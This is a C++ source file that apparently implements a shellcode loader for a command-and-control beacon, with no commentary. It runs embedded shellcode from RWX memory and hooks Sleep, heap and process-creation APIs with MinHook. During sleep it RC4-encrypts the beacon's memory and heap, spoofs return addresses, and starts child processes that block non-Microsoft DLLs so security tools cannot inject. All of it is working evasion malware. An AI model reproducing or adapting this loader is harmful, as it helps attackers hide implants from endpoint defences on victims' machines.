#include <Windows.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <vector>
#include "Shellcode.h"
#include "minhook/MinHook.h"

#ifdef _WIN64
#pragma comment(lib,"minhook/minhook.x64.lib")
#else
#pragma comment(lib,"minhook/minhook.x86.lib")
#endif

//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
};

ustring data, key;
PVOID BeaconBase, ShellcodeAddr;
HANDLE hNewProcessHeap;
BYTE EncryptKey[16];

std::vector<MEMORY_BASIC_INFORMATION> mbis;

typedef BOOL(WINAPI* fnInitOnceExecuteOnce)(PINIT_ONCE InitOnce, PINIT_ONCE_FN InitFn, PVOID Parameter, LPVOID* Context);
typedef NTSTATUS(WINAPI* fnSystemFunction033)(struct ustring* MemoryRegion, struct ustring* KeyPointer);

fnInitOnceExecuteOnce orgInitOnceExecuteOnce = (fnInitOnceExecuteOnce)GetProcAddress(GetModuleHandleA("kernel32.dll"), "InitOnceExecuteOnce");
fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");

VOID RandomGen();
VOID HeapEncrypt();
VOID BeaconEncrypt(BOOL fEncrypt);
VOID WINAPI MySleep(DWORD SleepTime);
HANDLE WINAPI MyGetProcessHeap();
HANDLE WINAPI MyHeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);
BOOL WINAPI MyCreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

int main()

{

    PVOID lpContext;
    INIT_ONCE g_InitOnce = INIT_ONCE_STATIC_INIT;

    RandomGen();

    hNewProcessHeap = HeapCreate(HEAP_NO_SERIALIZE, 0, 0);

    ShellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(ShellcodeAddr, shellcode, sizeof(shellcode));
    memset(shellcode, 0, len);

    MH_Initialize();
    MH_CreateHook((PBYTE)&Sleep, &MySleep, NULL);
    MH_CreateHook((PBYTE)&HeapCreate, &MyHeapCreate, NULL);
    MH_CreateHook((PBYTE)&CreateProcessA, &MyCreateProcessA, NULL);
    MH_CreateHook((PBYTE)&GetProcessHeap, &MyGetProcessHeap, NULL);
    MH_EnableHook((PBYTE)&Sleep);
    MH_EnableHook((PBYTE)&HeapCreate);
    MH_EnableHook((PBYTE)&CreateProcessA);
    MH_EnableHook((PBYTE)&GetProcessHeap);
    

    orgInitOnceExecuteOnce(&g_InitOnce, (PINIT_ONCE_FN)ShellcodeAddr, NULL, &lpContext);

    return 0;
}

VOID RandomGen()
{
    HCRYPTPROV hCryptProv;
    BYTE TmpKey[16] = { 0x11,0x02,0xbb,0xab,0x12,0x03,0x08,0x5c,0x11,0x02,0xbb,0xab,0x12,0x03,0x08,0x5c };

    memcpy(EncryptKey, TmpKey, 16);
    CryptAcquireContextA(&hCryptProv, NULL, NULL, PROV_RSA_FULL, 0);
    CryptGenRandom(hCryptProv, 16, EncryptKey);
    
    key.Buffer = EncryptKey;
    key.Length = 16;

    for (size_t i = 0; i < 16; i++)
    {
        printf("%x", key.Buffer[i]);
    }
    printf("\n");
}

VOID HeapEncrypt() {
    PROCESS_HEAP_ENTRY entry;

    SecureZeroMemory(&entry, sizeof(entry));
    while (HeapWalk(hNewProcessHeap, &entry)) {
        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
            data.Buffer = (PUCHAR)entry.lpData;
            data.Length = entry.cbData;
            SystemFunction033(&data, &key);
        }
    }

}

VOID BeaconEncrypt(BOOL fEncrypt) {
    SYSTEM_INFO info;
    MEMORY_BASIC_INFORMATION mbi;
    DWORD dwOld;
    SIZE_T CurrentAddr = 0;

    if (fEncrypt)
    {
        GetSystemInfo(&info);
        CurrentAddr = (SIZE_T)info.lpMinimumApplicationAddress;

        if (BeaconBase != ShellcodeAddr && ShellcodeAddr)
        {
            VirtualFree(ShellcodeAddr, 0, MEM_RELEASE);
        }

        while (CurrentAddr < (SIZE_T)info.lpMaximumApplicationAddress)
        {
            VirtualQuery((LPCVOID)CurrentAddr, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
            if (mbi.AllocationBase != BeaconBase)
            {
                if (mbi.Type & MEM_PRIVATE && mbi.Protect == PAGE_EXECUTE_READWRITE && mbi.RegionSize > 204800) {
                    VirtualFree(mbi.AllocationBase, 0, MEM_RELEASE);
                }
            }
            else
            {
                mbis.push_back(mbi);
                printf("BaseAddr-->%p\n", mbi.BaseAddress);
                printf("RegionSize--> % d\n", mbi.RegionSize);
            }
            CurrentAddr += mbi.RegionSize;
        }

        for (SIZE_T i = 0; i < mbis.size(); i++)
        {
            VirtualProtect(mbis[i].BaseAddress, mbis[i].RegionSize, PAGE_READWRITE, &dwOld);
            data.Buffer = (PUCHAR)mbis[i].BaseAddress;
            data.Length = mbis[i].RegionSize;
            SystemFunction033(&data, &key);
        }
    }

    else
    {
        for (SIZE_T i = 0; i < mbis.size(); i++)
        {
            data.Buffer = (PUCHAR)mbis[i].BaseAddress;
            data.Length = mbis[i].RegionSize;
            SystemFunction033(&data, &key);
            VirtualProtect(mbis[i].BaseAddress, mbis[i].RegionSize, mbis[i].Protect, &dwOld);
        }
        std::vector<MEMORY_BASIC_INFORMATION>().swap(mbis);
    }
}

VOID WINAPI MySleep(DWORD SleepTime) {

    MEMORY_BASIC_INFORMATION mbi;

    SIZE_T* overwrite = (SIZE_T*)_AddressOfReturnAddress();
    SIZE_T origReturnAddress = *overwrite;
    *overwrite = 0;
    
    MH_DisableHook((PBYTE)&Sleep);

    VirtualQuery((LPCVOID)origReturnAddress, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
    BeaconBase = mbi.AllocationBase;
    
    BeaconEncrypt(TRUE);
    HeapEncrypt();
    HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    WaitForSingleObject(hEvent, SleepTime);
    CloseHandle(hEvent);
    HeapEncrypt();
    BeaconEncrypt(FALSE);
    
    MH_EnableHook((PBYTE)&Sleep);

    *overwrite = origReturnAddress;
}

BOOL WINAPI MyCreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {
    BOOL result;
    STARTUPINFOEXA si;
    SIZE_T dwSize = 0;
    SIZE_T policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    SIZE_T* overwrite = (SIZE_T*)_AddressOfReturnAddress();
    SIZE_T origReturnAddress = *overwrite;
    *overwrite = 0;

    MH_DisableHook((PBYTE)&CreateProcessA);

    ZeroMemory(&si, sizeof(si));

    InitializeProcThreadAttributeList(NULL, 1, 0, &dwSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &dwSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
    memcpy(&si.StartupInfo, lpStartupInfo, sizeof(STARTUPINFOA));
    result = CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, EXTENDED_STARTUPINFO_PRESENT | dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si.StartupInfo, lpProcessInformation);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    MH_EnableHook((PBYTE)&CreateProcessA);

    *overwrite = origReturnAddress;
    return result;
}

HANDLE WINAPI MyHeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize) {
    
    HMODULE hModule;
    HANDLE hTmp;

    if (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCSTR)_ReturnAddress(), &hModule)) 
    {
        printf("HeapCreateFrom-->%p\n", _ReturnAddress());
        printf("HeapAddr-->%p\n", hNewProcessHeap);
        return hNewProcessHeap;
    }

    MH_DisableHook((PBYTE)&HeapCreate);
    hTmp = HeapCreate(flOptions, dwInitialSize, dwMaximumSize);
    MH_EnableHook((PBYTE)&HeapCreate);

    return hTmp;
}

HANDLE WINAPI MyGetProcessHeap() {
    
    HMODULE hModule;
    HANDLE hTmp;

    if (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCSTR)_ReturnAddress(), &hModule))
    {
        printf("GetProcessHeapFrom-->%p\n", _ReturnAddress());
        printf("HeapAddr-->%p\n", hNewProcessHeap);
        return hNewProcessHeap;
    }

    MH_DisableHook((PBYTE)&GetProcessHeap);
    hTmp = GetProcessHeap();
    MH_EnableHook((PBYTE)&GetProcessHeap);

    return hTmp;
}
